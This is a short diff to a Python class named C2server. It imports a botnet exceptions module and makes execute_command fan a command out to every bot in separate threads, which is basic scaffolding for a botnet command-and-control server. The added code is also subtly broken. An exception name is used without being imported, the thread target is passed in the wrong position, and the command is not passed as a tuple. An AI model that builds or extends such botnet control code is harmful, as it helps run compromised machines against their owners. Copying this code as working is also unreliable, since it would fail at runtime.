@@ -1,3 +1,8 @@
+import threading
+
+import botnet_exceptions
+
+
 class C2server():
 
     def __init__(self, user_id):
@@ -6,8 +11,14 @@ class C2server():
 
     def execute_command(self, command):
         """
-        Get from command queue and execute
+        Command botnet to execute command
         :param command: Command
         :return: bool
         """
-        pass
+        if not self.bots:
+            raise NoBotsException()
+
+        # TODO: maybe use async and await every bot.execute_command()?
+        for bot in self.bots:
+            bot_thread = threading.Thread(bot.execute_command, args=(command))
+            bot_thread.start()
